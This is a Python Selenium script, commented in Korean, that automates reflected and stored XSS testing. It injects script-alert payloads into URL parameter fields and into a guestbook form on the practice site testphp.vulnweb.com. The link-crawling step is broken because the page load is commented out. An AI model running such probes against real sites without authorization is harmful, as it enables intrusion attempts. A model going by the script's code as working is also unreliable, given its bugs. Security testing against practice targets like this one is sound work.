from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service
from bs4 import BeautifulSoup
import time
import os
from selenium.webdriver.common.by import By

# 현재 작업 디렉토리를 얻습니다.
current_directory = os.getcwd()

# GeckoDriver 실행 파일 경로 설정 (파이썬 코드가 실행되는 위치에 \path\to\geckodriver.exe 가 존재해야함)
geckodriver_path = current_directory + r"\path\to\geckodriver.exe"

def get_parameter_input_links(base_url):
    try:
        # Firefox 브라우저 실행
        service = Service(geckodriver_path)
        browser = webdriver.Firefox(service=service)

        # 웹페이지 열기
        #browser.get(base_url)
        #time.sleep(3)

        # 현재 페이지의 HTML 소스코드 가져오기
        page_source = browser.page_source

        # BeautifulSoup을 사용하여 HTML 파싱
        soup = BeautifulSoup(page_source, 'html.parser')

        # 페이지에서 모든 링크를 찾기
        links = soup.find_all('a', href=True)

        # 파라미터 입력 란이 존재하는 링크들 추출
        parameter_input_links = []
        for link in links:
            link_url = link['href']
            # 예제로 'parameter'이라는 문자열이 파라미터 입력란의 name 속성에 있을 때만 추출
            if "parameter" in link_url:
                parameter_input_links.append(link_url)

    except Exception as e:
        print(f"Error in get_parameter_input_links: {e}")
    finally:
        # 브라우저 종료
        browser.quit()

    return parameter_input_links

def test_xss(links):
    
    try:
        vulnerable_sites = []

        # Firefox 브라우저 실행
        service = Service(geckodriver_path)
        browser = webdriver.Firefox(service=service)

        for link in links:
            # 웹페이지 열기
            browser.get(link)
            time.sleep(3)

            # 파라미터 입력 란에 XSS 코드 입력
            parameter_input = browser.find_element(By.NAME,'parameter')  # 여기에 실제 파라미터 입력란의 name 값을 넣어주세요
            parameter_input.send_keys("<script>alert('XSS')</script>")
            parameter_input.send_keys(Keys.RETURN)

            # 대기 시간을 늘리거나 필요에 따라 페이지 로딩 여부를 확인하는 코드 추가 가능

            # 현재 페이지의 소스코드 가져오기
            page_source = browser.page_source

        
            # XSS가 발생한지 확인
            if "<script>alert('XSS')</script>" in page_source:
                vulnerable_sites.append(link)

    except Exception as e:
        print(f"Error in test_xss: {e}")
    finally:
        # 브라우저 종료
        browser.quit()

    return vulnerable_sites

def test_guestbook_xss(url):
    # Firefox 브라우저 실행
    service = Service(geckodriver_path)
    browser = webdriver.Firefox(service=service)

    # /guestbook.php 페이지로 이동
    browser.get(url + '/guestbook.php')
    time.sleep(3)

    # XSS 페이로드 리스트
    xss_payloads = ["<script>alert('XSS1')</script>", "<script>alert('XSS2')</script>"]

    for payload in xss_payloads:
        try:
            # 텍스트 박스에 XSS 페이로드 입력
            text_area = browser.find_element(By.NAME,'text')  # 실제 텍스트 박스의 name 속성을 넣어주세요
            text_area.clear()
            text_area.send_keys(payload)

            # 등록 버튼 클릭
            submit_button = browser.find_element(By.NAME,'submit')  # 실제 등록 버튼의 name 속성을 넣어주세요
            submit_button.click()
            time.sleep(3)

            # 알림 메시지 확인
            alert = browser.switch_to.alert
            print(f"XSS Alert: {alert.text}")
            alert.accept()
        except Exception as e:
            print(f"No XSS Alert: {e}")

    # 브라우저 종료
    browser.quit()

if __name__ == "__main__":
    # 기본 URL을 입력하세요.
    base_url = "http://testphp.vulnweb.com"  # 여기에 실제 기본 URL을 넣어주세요

    # 파라미터 입력란이 있는 링크들을 가져오기
    parameter_input_links = get_parameter_input_links(base_url)

    if parameter_input_links:
        print("파라미터 입력란이 있는 링크들:")
        for link in parameter_input_links:
            print(link)

        # XSS 테스트 실행
        vulnerable_sites = test_xss(parameter_input_links)

        if vulnerable_sites:
            print("\n취약점 발생 사이트들:")
            for site in vulnerable_sites:
                print(site)
        else:
            print("\n취약점이 발생한 사이트가 없습니다.")
    else:
        print("파라미터 입력란이 있는 링크가 없습니다.")
        
    test_guestbook_xss(base_url)
